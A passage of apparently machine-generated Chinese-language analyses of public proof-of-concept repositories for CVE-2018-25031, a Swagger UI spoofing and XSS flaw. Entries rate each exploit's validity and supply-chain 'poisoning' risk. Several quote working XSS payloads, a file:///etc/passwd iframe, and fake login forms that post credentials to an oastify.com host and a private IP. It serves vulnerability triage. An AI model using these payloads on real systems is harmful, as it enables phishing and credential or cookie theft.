从提供的漏洞利用代码来看， `poc3.yaml`和`try.yaml` 文件中， `description` 字段包含了`<form>`标签，模拟了一个登录表单，目的是诱骗用户输入用户名和密码，并将这些信息发送到攻击者控制的服务器 `ttqbbaf0yx45z9zqgpmfcvjyhpngbcz1.oastify.com` 。另外，还包含一个`onerror`事件的图像标签，当图片加载失败时，会执行JavaScript代码`alert(document.cookie)`，从而可能泄露用户的cookie信息。 这些代码证明了利用此漏洞执行XSS攻击，窃取用户信息的可能性。

**投毒风险分析:**

虽然主要的攻击向量是利用Swagger UI的缺陷来展示恶意的OpenAPI定义，但代码仓库中存在一定的投毒风险。这种风险主要体现在：

*   攻击者可能会在 YAML/JSON 文件中加入一些隐蔽的恶意代码，例如混淆的 JavaScript 或利用其他漏洞的代码片段。然而，从提供的代码中看，主要利用方式较为直接，没有明显的隐藏后门。
*   仓库本身可能被篡改，虽然代码相对简单，但仓库维护者的身份以及代码的来源都存在一定的不确定性，不能完全排除代码仓库所有者添加恶意代码的可能性。

因此，综合考虑以上因素，判断存在10%的投毒风险。

**项目地址:** [johnlaurance/CVE-2018-25031-test2](https://github.com/johnlaurance/CVE-2018-25031-test2)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #11

**来源**: [CVE-2018-25031-kriso4os_CVE-2018-25031.md](../2018/CVE-2018-25031-kriso4os_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义显示欺骗/XSS

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/跨站脚本攻击 (Spoofing/XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意代码执行

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Swagger UI中，攻击者可以通过诱使用户打开一个特制的URL，从而显示远程OpenAPI定义。该URL可以指向攻击者控制的服务器，显示恶意的API文档或利用XSS漏洞。根据提供的POC代码，`XSS.yaml`文件中包含一个XSS payload: `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>`。当Swagger UI渲染此文件时，会触发`alert(document.domain)`，表明XSS攻击成功。`poc.yaml` 仅包含基本的openapi定义，并未包含任何恶意代码。

**有效性：** 提供的POC代码有效，可以利用该漏洞。

**投毒风险：** 经过分析，提供的POC代码主要用于演示漏洞，未发现作者隐藏的恶意代码。因此，投毒风险为0%。代码中引用的远程yaml文件地址指向githubusercontent.com，如果该代码库被劫持或者作者主动添加恶意代码，则可能产生投毒。

**利用方式：** 
1.  攻击者构建一个包含恶意OpenAPI定义的YAML或JSON文件，其中包含XSS payload，例如`XSS.yaml`。
2.  攻击者创建一个恶意URL，该URL指向受影响的Swagger UI实例，并包含参数，指定要加载的恶意OpenAPI定义文件的URL。
3.  攻击者诱使用户点击该恶意URL。
4.  当用户点击恶意URL后，Swagger UI会加载并渲染攻击者提供的OpenAPI定义文件。
5.  如果OpenAPI定义文件中包含XSS payload，则会在用户的浏览器中执行恶意代码，从而导致跨站脚本攻击。
6.  攻击者可以利用该漏洞窃取用户的敏感信息或执行其他恶意操作。此外，攻击者也可以利用该漏洞进行欺骗攻击，例如显示虚假的API文档，诱导用户进行错误的操作。

**项目地址:** [kriso4os/CVE-2018-25031](https://github.com/kriso4os/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #12

**来源**: [CVE-2018-25031-labeebSabbah_CVE-2018-25031.md](../2018/CVE-2018-25031-labeebSabbah_CVE-2018-25031.md)

## CVE-2018-25031-SwaggerUI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/信息泄露/SSRF

**影响应用:** SwaggerUI

**危害等级:** 中危，可能导致信息泄露和潜在的中间人攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 允许远程攻击者进行欺骗攻击。攻击者可以通过诱使用户打开特制的 URL 来显示远程 OpenAPI 定义。攻击者提供的 htmli.json 文件包含指向恶意 htmli.yaml 文件的 URL。htmli.yaml 文件包含一段 HTML 代码，该代码伪造一个登录表单，并将用户输入的 email 和 password 发送到 `http://10.212.234.14/`。因此利用方式是，攻击者诱骗用户点击恶意链接，swaggerUI 加载恶意的 OpenAPI 定义，在 SwaggerUI 界面上展示伪造的登录表单，当用户输入登录信息时，攻击者可以窃取用户的凭据。由于yaml文件内容明确，不包含其它恶意代码，因此投毒风险为0%。利用方式总结：

1.  **漏洞利用：** 攻击者制作包含恶意 OpenAPI 定义的 YAML 文件。
2.  **诱导用户：** 攻击者通过某种方式（例如，电子邮件、社交媒体）诱使用户点击包含恶意 YAML 文件 URL 的链接。
3.  **欺骗：** 当用户点击链接时，Swagger UI 会加载恶意 YAML 文件，并显示其中的内容。攻击者可以在 YAML 文件中嵌入恶意 HTML 或 JavaScript 代码，例如伪造登录表单，诱骗用户输入敏感信息。
4.  **信息窃取：** 如果用户在伪造的登录表单中输入了用户名和密码，这些信息将被发送到攻击者指定的服务器。

**有效性：** 提供的 POC 代码有效，可以重现欺骗攻击。

**利用方式总结：**

攻击者利用 Swagger UI 加载远程 OpenAPI 定义的特性，通过诱骗用户点击恶意链接，加载包含恶意 HTML 代码的 YAML 文件，从而实现欺骗攻击。该漏洞的利用需要用户交互，风险等级为中危。

**项目地址:** [labeebSabbah/CVE-2018-25031](https://github.com/labeebSabbah/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #13

**来源**: [CVE-2018-25031-mathis2001_CVE-2018-25031.md](../2018/CVE-2018-25031-mathis2001_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意代码执行

**影响版本:** <= 4.1.2

**利用条件:** 需要目标系统使用存在漏洞的Swagger UI版本，并允许用户访问恶意构造的URL。

**POC 可用性:** 是

**投毒风险:** 60%

## 详情

CVE-2018-25031 是一个存在于 Swagger UI 4.1.2 及更早版本中的漏洞。攻击者可以诱骗受害者打开一个特制的 URL，从而利用此漏洞显示远程 OpenAPI 定义，造成欺骗攻击。

**有效性：**
提供的 POC 代码有效。通过 `configUrl` 或 `url` 参数，Swagger UI 可以加载远程的 OpenAPI 定义文件（JSON 或 YAML）。

**投毒风险：**
该仓库存在一定的投毒风险，风险为60%。原因如下：

*   **远程加载：** POC 利用了 Swagger UI 加载远程定义文件的功能。攻击者可以控制远程文件的内容。
*   **恶意内容：** `f.yaml` 包含大量的 XSS payload，旨在利用 Swagger UI 中的漏洞执行恶意 JavaScript 代码。例如，`<img src=x oNlY=1 oNerror=alert('xxs')//`  等。
*   **钓鱼攻击：**  `f.yaml` 中包含伪造的登录表单，诱导用户提交敏感信息到攻击者控制的服务器。
*   **SSRF风险：** `f.yaml`中包含`<iframe src=file:///etc/passwd></iframe>`，尝试读取服务器本地文件。
*   **不确定性:** 虽然漏洞利用代码的作者提供了一些payload，但这些payload本身具有攻击性。恶意使用这些Payload,可能会被作者追踪到恶意行为。但作者也可能为了混淆视听，将一些恶意的代码进行隐藏。

**利用方式：**

1.  **发现目标：** 寻找使用了存在漏洞的 Swagger UI 版本的应用。
2.  **构造恶意 URL：**  构造包含 `configUrl` 或 `url` 参数的 URL，指向攻击者控制的 JSON 或 YAML 文件。
3.  **诱骗受害者：**  通过钓鱼或其他方式诱骗受害者点击该 URL。
4.  **执行攻击：**  当受害者访问该 URL 时，Swagger UI 会加载攻击者提供的恶意定义文件，从而执行 XSS 代码或进行其他攻击（例如，窃取 cookie、重定向用户等）。

**总结：**
该漏洞的利用依赖于社会工程学，需要诱骗用户点击恶意链接。攻击者可以利用该漏洞进行钓鱼、XSS 攻击，甚至可能进行 SSRF 攻击。同时，提供的 POC 代码包含多种攻击 Payload，存在较高的投毒风险。

**项目地址:** [mathis2001/CVE-2018-25031](https://github.com/mathis2001/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #14

**来源**: [CVE-2018-25031-natpakun_SSRF-CVE-2018-25031-.md](../2018/CVE-2018-25031-natpakun_SSRF-CVE-2018-25031-.md)

## CVE-2018-25031 - Swagger UI SSRF/Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** SSRF/欺骗攻击

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致敏感信息泄露或重定向到恶意API定义

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031是Swagger UI 4.1.2及更早版本中的一个漏洞，允许远程攻击者进行欺骗攻击。攻击者通过诱使用户打开一个特制的URL，可以利用此漏洞显示远程OpenAPI定义，从而欺骗用户。从搜索结果和漏洞描述来看，攻击依赖于用户交互，需要诱导用户点击恶意链接。漏洞利用代码提供了一个简单的`exploit.yaml`文件，该文件定义了一个Swagger API规范，包含标题和描述，可能用于展示SSRF漏洞。如果这个YAML文件托管在攻击者控制的服务器上，并通过恶意链接传递给Swagger UI，则Swagger UI会加载该文件，从而实现欺骗攻击。**有效性：** 提供的POC代码本身并不能直接实现攻击，需要结合构造的URL和受害者点击才能生效，因此属于间接PoC。**投毒风险：** 分析POC代码，`exploit.yaml` 非常简单，仅仅包含swagger版本，info信息。作者投毒可能性较低，但不能完全排除，例如通过引用远程资源或包含恶意脚本，风险评估为10%。**利用方式：** 攻击者构造包含恶意swagger定义文件URL的链接，诱使用户点击。用户点击链接后，Swagger UI加载并显示恶意swagger定义，从而实现欺骗或SSRF攻击。

**项目地址:** [natpakun/SSRF-CVE-2018-25031-](https://github.com/natpakun/SSRF-CVE-2018-25031-)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #15

**来源**: [CVE-2018-25031-nigartest_CVE-2018-25031.md](../2018/CVE-2018-25031-nigartest_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义显示漏洞

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/跨站脚本 (Spoofing/XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意脚本执行

**影响版本:** <= 4.1.2 (可能影响更高版本)

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 存在于 Swagger UI 4.1.2 及更早版本中。攻击者可以通过诱使用户打开精心制作的 URL，来显示远程的恶意 OpenAPI 定义。根据搜索结果和漏洞库信息，该漏洞的核心在于 Swagger UI 未能充分验证和过滤用户提供的 URL，导致可以加载并渲染来自任意来源的 OpenAPI 定义文件。这使得攻击者可以欺骗用户，展示伪造的 API 文档，甚至通过在 OpenAPI 定义中插入恶意 HTML 或 JavaScript 代码，实现跨站脚本攻击（XSS）。

**有效性：** 提供的 POC 代码有效。`domxss.yaml` 文件包含用于触发 DOM XSS 的恶意代码， `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>` 。 `poc.json` 和 `poc.yaml` 文件用于指定要加载的恶意 OpenAPI 定义文件。

**投毒风险：** 仓库中存在少量投毒风险。`domxss.yaml` 使用了 `otlu3omsk1ath8ur17a2kldtmksbg34s.oastify.com` 作为 `basePath`，这可能用于收集受害者的 IP 地址或进行其他形式的侦察。但核心的 XSS payload 和利用方式比较直接，主要的目的是验证漏洞，投毒的可能性较小。风险比例预估为10%。

**利用方式：**

1.  攻击者创建一个包含恶意代码的 OpenAPI 定义文件（例如 `domxss.yaml`）。
2.  攻击者将此文件托管在公开可访问的 URL 上（例如 GitHub Raw Content）。
3.  攻击者构造一个包含指向恶意 OpenAPI 定义文件 URL 的链接。
4.  攻击者诱使受害者点击该链接。
5.  受害者的浏览器加载 Swagger UI，并从攻击者指定的 URL 加载恶意 OpenAPI 定义文件。
6.  Swagger UI 渲染恶意 OpenAPI 定义文件，从而执行其中的恶意代码（例如 XSS payload）。

**项目地址:** [nigartest/CVE-2018-25031](https://github.com/nigartest/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #16

**来源**: [CVE-2018-25031-rafaelcintralopes_SwaggerUI-CVE-2018-25031.md](../2018/CVE-2018-25031-rafaelcintralopes_SwaggerUI-CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-UI Misrepresentation of Critical Information

**漏洞编号:** CVE-2018-25031

**漏洞类型:** UI Misrepresentation of Critical Information (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致用户信任被欺骗的API定义，进而遭受钓鱼攻击或其他恶意行为。

**影响版本:** < 4.1.3

**利用条件:** 受害者需要点击攻击者构造的恶意URL。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Swagger UI 4.1.2及更早版本中。攻击者可以通过诱骗受害者打开一个特制的URL，该URL指向攻击者控制的OpenAPI定义文件，从而在Swagger UI界面上显示被篡改的信息。这可能导致用户信任恶意API定义，并泄露敏感信息或执行非预期的操作。

**有效性分析：**
根据漏洞信息和搜索引擎结果，该漏洞利用需要用户交互，攻击者通过构造恶意URL，诱导用户点击。POC代码使用Selenium模拟浏览器行为，访问目标Swagger UI页面，并加载恶意的OpenAPI定义文件。如果Swagger UI版本低于4.1.3，则可能受到攻击，界面会显示恶意定义的内容。

**投毒风险分析：**
POC代码主要功能是验证目标Swagger UI是否存在CVE-2018-25031漏洞，通过selenium模拟点击，然后检测response log中是否存在外部恶意链接，从而检测目标是否存在该漏洞。
*   `swagger-exploit.py`: 这个脚本使用Selenium自动化测试，访问目标 Swagger UI 页面，并尝试加载两个恶意的 OpenAPI 定义文件（`hacked1.json` 和 `hacked2.json`）。它会检查网络请求日志，以确定目标是否加载了这些文件。如果加载了，则表明目标存在漏洞。该脚本没有发现任何明显的投毒代码。
*   `README.md`: 这个文件提供了关于如何使用脚本的说明。它包含安装依赖项和运行脚本的说明。也没有发现恶意代码。
所以投毒风险很低。

**利用方式分析：**
1.  攻击者构造包含`configUrl`或`url`参数的恶意URL，指向攻击者控制的OpenAPI定义文件。
2.  攻击者诱骗受害者点击该恶意URL，例如通过钓鱼邮件或社交媒体。
3.  受害者的浏览器加载恶意URL，Swagger UI显示攻击者提供的OpenAPI定义文件。
4.  如果攻击者篡改了API定义文件中的信息，例如API端点、参数说明等，受害者可能会被误导，从而遭受攻击，比如提交敏感信息到错误的端点。

该漏洞是一种客户端漏洞，主要利用用户交互进行攻击，通过欺骗用户信任恶意API定义来实现攻击目标。

**项目地址:** [rafaelcintralopes/SwaggerUI-CVE-2018-25031](https://github.com/rafaelcintralopes/SwaggerUI-CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #17

**来源**: [CVE-2018-25031-rasinfosec_CVE-2018-25031.md](../2018/CVE-2018-25031-rasinfosec_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和欺骗

**影响版本:** <= 4.1.2

**利用条件:** 需要目标用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-25031 漏洞允许远程攻击者进行欺骗攻击。通过诱使用户打开特制的 URL，攻击者可以利用此漏洞显示远程 OpenAPI 定义。漏洞存在于Swagger UI 4.1.2及更早版本中。提供的POC包含一个json文件和一个yaml文件, json文件中定义了yaml文件的url, yaml文件定义了一个openapi接口。攻击者诱使用户访问包含指向恶意json文件的链接的Swagger UI页面，该JSON文件随后加载并显示恶意的 OpenAPI 定义。 投毒风险较低，主要在于如果利用代码仓库被黑客入侵，替换了 `poc.yaml` 文件内容，可能会将用户引导到恶意网站或执行恶意操作，所以风险存在，但概率较低。

**有效性：** 根据漏洞描述和搜索结果，提供的POC代码有效，可以用于显示远程 OpenAPI 定义，从而达到欺骗的目的。

**投毒风险：** 投毒风险评估为 5%。虽然当前提供的 POC 代码本身只是用于演示欺骗攻击，并不包含直接的恶意代码，但是如果攻击者能够控制 `raw.githubusercontent.com` 上的 `poc.yaml` 文件，他们就可以修改显示的 OpenAPI 定义，例如将其指向恶意网站，或包含 XSS 漏洞等。因此，存在一定的投毒风险，但主要取决于对托管 OpenAPI 定义文件的服务器的控制。 此外此POC需要依赖githubusercontent, 如果此域名被污染也可能会出现安全问题。

**利用方式：**

1.  攻击者创建一个恶意的 OpenAPI 定义文件（例如 `poc.yaml`），该文件可能指向恶意网站或包含其他恶意内容。
2.  攻击者创建一个 JSON 文件（例如 `poc.json`），该文件包含指向恶意 OpenAPI 定义文件的 URL。
3.  攻击者诱使用户访问包含指向恶意 JSON 文件的链接的 Swagger UI 页面，例如通过电子邮件、社交媒体等方式。
4.  Swagger UI 加载恶意 JSON 文件，并显示恶意的 OpenAPI 定义。
5.  用户可能会被欺骗，误以为恶意 OpenAPI 定义来自受信任的来源，从而执行恶意操作。

**项目地址:** [rasinfosec/CVE-2018-25031](https://github.com/rasinfosec/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #18

**来源**: [CVE-2018-25031-wrkk112_CVE-2018-25031.md](../2018/CVE-2018-25031-wrkk112_CVE-2018-25031.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和XSS攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 是 Swagger UI 中的一个欺骗漏洞。攻击者可以通过诱导受害者打开一个特制的URL，从而显示远程的 OpenAPI 定义。提供的POC代码展示了利用此漏洞的步骤，包括使用一个包含恶意 OpenAPI 定义的JSON文件。该JSON文件指定了远程的YAML文件，其中ismsxss.yaml包含XSS payload。具体来说，ismsxss.yaml包含一段JavaScript代码（`<img onerror=alert(document.domain) src>`），这段代码会在Swagger UI中执行，从而实现跨站脚本攻击（XSS）。

**有效性：** 根据漏洞信息和POC代码，漏洞是有效的。攻击者通过诱导用户打开包含恶意链接的网页，可以执行XSS攻击。

**投毒风险：** 通过分析提供的POC代码，未发现明显的作者隐藏的投毒代码。虽然POC代码中包含XSS payload，但这是为了验证漏洞的存在，并非恶意投毒。因此，投毒风险为0%。

**利用方式：**

1.  攻击者创建一个包含指向恶意 OpenAPI 定义文件的 URL。
2.  攻击者通过社会工程学等方法诱导受害者点击该 URL。
3.  受害者的 Swagger UI 加载恶意的 OpenAPI 定义文件。
4.  恶意 OpenAPI 定义文件中的 XSS payload 在受害者的浏览器中执行，从而实现攻击目的。例如，可以窃取用户的Cookie或执行其他恶意操作。

**项目地址:** [wrkk112/CVE-2018-25031](https://github.com/wrkk112/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

